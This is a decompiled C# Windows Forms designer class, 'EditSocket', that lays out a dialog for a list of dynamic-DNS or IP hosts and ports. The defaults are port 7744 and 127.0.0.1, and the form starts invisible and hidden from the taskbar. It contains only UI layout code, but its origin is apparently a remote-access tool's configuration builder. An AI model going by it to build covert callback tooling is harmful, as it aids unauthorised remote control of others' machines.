// Token: 0x02000073 RID: 115
[global::Microsoft.VisualBasic.CompilerServices.DesignerGenerated]
public partial class EditSocket : global::System.Windows.Forms.Form
{
	// Token: 0x0600054E RID: 1358 RVA: 0x00083868 File Offset: 0x00081A68
	[global::System.Diagnostics.DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && this.components != null)
			{
				this.components.Dispose();
			}
		}
		finally
		{
			base.Dispose(disposing);
		}
	}

	// Token: 0x0600054F RID: 1359 RVA: 0x000838AC File Offset: 0x00081AAC
	[global::System.Diagnostics.DebuggerStepThrough]
	private void InitializeComponent()
	{
		this.components = new global::System.ComponentModel.Container();
		global::System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle = new global::System.Windows.Forms.DataGridViewCellStyle();
		global::System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle2 = new global::System.Windows.Forms.DataGridViewCellStyle();
		this.PanelBOX = new global::System.Windows.Forms.Panel();
		this.OKY = new global::System.Windows.Forms.Button();
		this.btnUp = new global::System.Windows.Forms.Button();
		this.btnDown = new global::System.Windows.Forms.Button();
		this.T0 = new global::System.Windows.Forms.Label();
		this.Label2 = new global::System.Windows.Forms.Label();
		this.Label1 = new global::System.Windows.Forms.Label();
		this.b_Add = new global::System.Windows.Forms.Button();
		this.b_del = new global::System.Windows.Forms.Button();
		this.DGV0 = new global::System.Windows.Forms.DataGridView();
		this.Column2 = new global::System.Windows.Forms.DataGridViewTextBoxColumn();
		this.po = new global::System.Windows.Forms.NumericUpDown();
		this.TextIP = new global::System.Windows.Forms.TextBox();
		this.TOpacity = new global::System.Windows.Forms.Timer(this.components);
		this.PanelBOX.SuspendLayout();
		((global::System.ComponentModel.ISupportInitialize)this.DGV0).BeginInit();
		((global::System.ComponentModel.ISupportInitialize)this.po).BeginInit();
		base.SuspendLayout();
		this.PanelBOX.Paint += new global::System.Windows.Forms.PaintEventHandler(this.PanelBOX_Paint);
		this.btnUp.Click += new global::System.EventHandler(this.btnUp_Click);
		this.btnDown.Click += new global::System.EventHandler(this.btnDown_Click);
		this.b_Add.Click += new global::System.EventHandler(this.b_Add_Click);
		this.b_del.Click += new global::System.EventHandler(this.b_del_Click);
		this.OKY.Click += new global::System.EventHandler(this.OKY_Click);
		this.TOpacity.Tick += new global::System.EventHandler(this.TOpacity_Tick);
		this.PanelBOX.Controls.Add(this.OKY);
		this.PanelBOX.Controls.Add(this.btnUp);
		this.PanelBOX.Controls.Add(this.btnDown);
		this.PanelBOX.Controls.Add(this.T0);
		this.PanelBOX.Controls.Add(this.Label2);
		this.PanelBOX.Controls.Add(this.Label1);
		this.PanelBOX.Controls.Add(this.b_Add);
		this.PanelBOX.Controls.Add(this.b_del);
		this.PanelBOX.Controls.Add(this.DGV0);
		this.PanelBOX.Controls.Add(this.po);
		this.PanelBOX.Controls.Add(this.TextIP);
		this.PanelBOX.Dock = global::System.Windows.Forms.DockStyle.Fill;
		this.PanelBOX.Location = new global::System.Drawing.Point(0, 0);
		this.PanelBOX.Name = "PanelBOX";
		this.PanelBOX.Size = new global::System.Drawing.Size(269, 362);
		this.PanelBOX.TabIndex = 11;
		this.OKY.BackColor = global::System.Drawing.Color.FromArgb(190, 190, 190);
		this.OKY.FlatStyle = global::System.Windows.Forms.FlatStyle.Flat;
		this.OKY.ForeColor = global::System.Drawing.Color.Black;
		this.OKY.Location = new global::System.Drawing.Point(185, 299);
		this.OKY.Name = "OKY";
		this.OKY.Size = new global::System.Drawing.Size(67, 23);
		this.OKY.TabIndex = 14;
		this.OKY.Text = "OK";
		this.OKY.UseVisualStyleBackColor = false;
		this.btnUp.BackColor = global::System.Drawing.Color.FromArgb(190, 190, 190);
		this.btnUp.FlatStyle = global::System.Windows.Forms.FlatStyle.Flat;
		this.btnUp.ForeColor = global::System.Drawing.Color.Black;
		this.btnUp.Location = new global::System.Drawing.Point(185, 241);
		this.btnUp.Name = "btnUp";
		this.btnUp.Size = new global::System.Drawing.Size(67, 23);
		this.btnUp.TabIndex = 14;
		this.btnUp.Text = "up";
		this.btnUp.UseVisualStyleBackColor = false;
		this.btnDown.BackColor = global::System.Drawing.Color.FromArgb(190, 190, 190);
		this.btnDown.FlatStyle = global::System.Windows.Forms.FlatStyle.Flat;
		this.btnDown.ForeColor = global::System.Drawing.Color.Black;
		this.btnDown.Location = new global::System.Drawing.Point(185, 270);
		this.btnDown.Name = "btnDown";
		this.btnDown.Size = new global::System.Drawing.Size(67, 23);
		this.btnDown.TabIndex = 13;
		this.btnDown.Text = "down";
		this.btnDown.UseVisualStyleBackColor = false;
		this.T0.AutoSize = true;
		this.T0.ForeColor = global::System.Drawing.Color.FromArgb(190, 190, 190);
		this.T0.Location = new global::System.Drawing.Point(-1, 0);
		this.T0.Name = "T0";
		this.T0.Size = new global::System.Drawing.Size(97, 13);
		this.T0.TabIndex = 12;
		this.T0.Text = "[--- connection ---]";
		this.Label2.AutoSize = true;
		this.Label2.ForeColor = global::System.Drawing.Color.FromArgb(190, 190, 190);
		this.Label2.Location = new global::System.Drawing.Point(182, 75);
		this.Label2.Name = "Label2";
		this.Label2.Size = new global::System.Drawing.Size(27, 13);
		this.Label2.TabIndex = 11;
		this.Label2.Text = "port";
		this.Label1.AutoSize = true;
		this.Label1.ForeColor = global::System.Drawing.Color.FromArgb(190, 190, 190);
		this.Label1.Location = new global::System.Drawing.Point(0, 25);
		this.Label1.Name = "Label1";
		this.Label1.Size = new global::System.Drawing.Size(81, 13);
		this.Label1.TabIndex = 10;
		this.Label1.Text = "dynamic DNS/ip";
		this.b_Add.BackColor = global::System.Drawing.Color.FromArgb(190, 190, 190);
		this.b_Add.FlatStyle = global::System.Windows.Forms.FlatStyle.Flat;
		this.b_Add.ForeColor = global::System.Drawing.Color.Black;
		this.b_Add.Location = new global::System.Drawing.Point(185, 130);
		this.b_Add.Name = "b_Add";
		this.b_Add.Size = new global::System.Drawing.Size(67, 23);
		this.b_Add.TabIndex = 7;
		this.b_Add.Text = "Add";
		this.b_Add.UseVisualStyleBackColor = false;
		this.b_del.BackColor = global::System.Drawing.Color.FromArgb(190, 190, 190);
		this.b_del.FlatStyle = global::System.Windows.Forms.FlatStyle.Flat;
		this.b_del.ForeColor = global::System.Drawing.Color.Black;
		this.b_del.Location = new global::System.Drawing.Point(185, 159);
		this.b_del.Name = "b_del";
		this.b_del.Size = new global::System.Drawing.Size(67, 23);
		this.b_del.TabIndex = 8;
		this.b_del.Text = "DEL";
		this.b_del.UseVisualStyleBackColor = false;
		this.DGV0.AllowUserToAddRows = false;
		this.DGV0.AllowUserToDeleteRows = false;
		this.DGV0.AllowUserToResizeColumns = false;
		this.DGV0.AllowUserToResizeRows = false;
		this.DGV0.AutoSizeColumnsMode = global::System.Windows.Forms.DataGridViewAutoSizeColumnsMode.Fill;
		this.DGV0.AutoSizeRowsMode = global::System.Windows.Forms.DataGridViewAutoSizeRowsMode.AllCells;
		this.DGV0.BackgroundColor = global::System.Drawing.Color.Black;
		this.DGV0.BorderStyle = global::System.Windows.Forms.BorderStyle.None;
		this.DGV0.CellBorderStyle = global::System.Windows.Forms.DataGridViewCellBorderStyle.None;
		this.DGV0.ColumnHeadersBorderStyle = global::System.Windows.Forms.DataGridViewHeaderBorderStyle.None;
		dataGridViewCellStyle.Alignment = global::System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
		dataGridViewCellStyle.BackColor = global::System.Drawing.Color.Black;
		dataGridViewCellStyle.Font = new global::System.Drawing.Font("Calibri", 8.25f, global::System.Drawing.FontStyle.Bold, global::System.Drawing.GraphicsUnit.Point, 0);
		dataGridViewCellStyle.ForeColor = global::System.Drawing.Color.FromArgb(190, 190, 190);
		dataGridViewCellStyle.SelectionBackColor = global::System.Drawing.SystemColors.Highlight;
		dataGridViewCellStyle.SelectionForeColor = global::System.Drawing.SystemColors.HighlightText;
		dataGridViewCellStyle.WrapMode = global::System.Windows.Forms.DataGridViewTriState.True;
		this.DGV0.ColumnHeadersDefaultCellStyle = dataGridViewCellStyle;
		this.DGV0.ColumnHeadersHeightSizeMode = global::System.Windows.Forms.DataGridViewColumnHeadersHeightSizeMode.AutoSize;
		this.DGV0.Columns.AddRange(new global::System.Windows.Forms.DataGridViewColumn[]
		{
			this.Column2
		});
		dataGridViewCellStyle2.Alignment = global::System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
		dataGridViewCellStyle2.BackColor = global::System.Drawing.Color.Black;
		dataGridViewCellStyle2.Font = new global::System.Drawing.Font("Calibri", 8.25f, global::System.Drawing.FontStyle.Bold, global::System.Drawing.GraphicsUnit.Point, 0);
		dataGridViewCellStyle2.ForeColor = global::System.Drawing.Color.FromArgb(190, 190, 190);
		dataGridViewCellStyle2.SelectionBackColor = global::System.Drawing.Color.FromArgb(190, 190, 190);
		dataGridViewCellStyle2.SelectionForeColor = global::System.Drawing.Color.Black;
		dataGridViewCellStyle2.WrapMode = global::System.Windows.Forms.DataGridViewTriState.False;
		this.DGV0.DefaultCellStyle = dataGridViewCellStyle2;
		this.DGV0.EditMode = global::System.Windows.Forms.DataGridViewEditMode.EditProgrammatically;
		this.DGV0.EnableHeadersVisualStyles = false;
		this.DGV0.GridColor = global::System.Drawing.Color.FromArgb(42, 42, 42);
		this.DGV0.Location = new global::System.Drawing.Point(2, 66);
		this.DGV0.Name = "DGV0";
		this.DGV0.RowHeadersBorderStyle = global::System.Windows.Forms.DataGridViewHeaderBorderStyle.Single;
		this.DGV0.RowHeadersVisible = false;
		this.DGV0.SelectionMode = global::System.Windows.Forms.DataGridViewSelectionMode.FullRowSelect;
		this.DGV0.Size = new global::System.Drawing.Size(174, 240);
		this.DGV0.TabIndex = 5;
		this.Column2.HeaderText = "DNS/ip:port";
		this.Column2.Name = "Column2";
		this.po.BackColor = global::System.Drawing.Color.Black;
		this.po.BorderStyle = global::System.Windows.Forms.BorderStyle.None;
		this.po.ForeColor = global::System.Drawing.Color.FromArgb(190, 190, 190);
		this.po.Location = new global::System.Drawing.Point(185, 91);
		global::System.Windows.Forms.NumericUpDown numericUpDown = this.po;
		int[] array = new int[4];
		array[0] = 65535;
		numericUpDown.Maximum = new decimal(array);
		this.po.Name = "po";
		this.po.Size = new global::System.Drawing.Size(67, 16);
		this.po.TabIndex = 9;
		global::System.Windows.Forms.NumericUpDown numericUpDown2 = this.po;
		int[] array2 = new int[4];
		array2[0] = 7744;
		numericUpDown2.Value = new decimal(array2);
		this.TextIP.BackColor = global::System.Drawing.Color.Black;
		this.TextIP.BorderStyle = global::System.Windows.Forms.BorderStyle.None;
		this.TextIP.ForeColor = global::System.Drawing.Color.FromArgb(190, 190, 190);
		this.TextIP.Location = new global::System.Drawing.Point(3, 44);
		this.TextIP.Name = "TextIP";
		this.TextIP.Size = new global::System.Drawing.Size(173, 13);
		this.TextIP.TabIndex = 0;
		this.TextIP.Text = "127.0.0.1";
		this.TOpacity.Interval = 1;
		base.AutoScaleDimensions = new global::System.Drawing.SizeF(6f, 13f);
		base.AutoScaleMode = global::System.Windows.Forms.AutoScaleMode.Font;
		this.BackColor = global::System.Drawing.Color.Black;
		base.ClientSize = new global::System.Drawing.Size(269, 362);
		base.Controls.Add(this.PanelBOX);
		base.FormBorderStyle = global::System.Windows.Forms.FormBorderStyle.FixedSingle;
		base.MaximizeBox = false;
		base.Name = "EditSocket";
		base.Opacity = 0.0;
		base.ShowInTaskbar = false;
		this.Text = "EditSocket";
		this.PanelBOX.ResumeLayout(false);
		this.PanelBOX.PerformLayout();
		((global::System.ComponentModel.ISupportInitialize)this.DGV0).EndInit();
		((global::System.ComponentModel.ISupportInitialize)this.po).EndInit();
		base.ResumeLayout(false);
	}

	// Token: 0x04000747 RID: 1863
	private global::System.ComponentModel.IContainer components;

	// Token: 0x04000750 RID: 1872
	internal global::System.Windows.Forms.Panel PanelBOX;

	// Token: 0x04000751 RID: 1873
	internal global::System.Windows.Forms.Button btnUp;

	// Token: 0x04000752 RID: 1874
	internal global::System.Windows.Forms.Button btnDown;

	// Token: 0x04000753 RID: 1875
	[global::System.Runtime.CompilerServices.AccessedThroughProperty("T0")]
	internal global::System.Windows.Forms.Label T0;

	// Token: 0x04000754 RID: 1876
	[global::System.Runtime.CompilerServices.AccessedThroughProperty("Label2")]
	internal global::System.Windows.Forms.Label Label2;

	// Token: 0x04000755 RID: 1877
	[global::System.Runtime.CompilerServices.AccessedThroughProperty("Label1")]
	internal global::System.Windows.Forms.Label Label1;

	// Token: 0x04000756 RID: 1878
	internal global::System.Windows.Forms.Button b_Add;

	// Token: 0x04000757 RID: 1879
	internal global::System.Windows.Forms.Button b_del;

	// Token: 0x04000758 RID: 1880
	[global::System.Runtime.CompilerServices.AccessedThroughProperty("DGV0")]
	internal global::System.Windows.Forms.DataGridView DGV0;

	// Token: 0x04000759 RID: 1881
	[global::System.Runtime.CompilerServices.AccessedThroughProperty("Column2")]
	internal global::System.Windows.Forms.DataGridViewTextBoxColumn Column2;

	// Token: 0x0400075A RID: 1882
	[global::System.Runtime.CompilerServices.AccessedThroughProperty("TextIP")]
	internal global::System.Windows.Forms.TextBox TextIP;

	// Token: 0x0400075B RID: 1883
	internal global::System.Windows.Forms.Button OKY;

	// Token: 0x0400075C RID: 1884
	[global::System.Runtime.CompilerServices.AccessedThroughProperty("po")]
	internal global::System.Windows.Forms.NumericUpDown po;

	// Token: 0x0400075D RID: 1885
	internal global::System.Windows.Forms.Timer TOpacity;
}
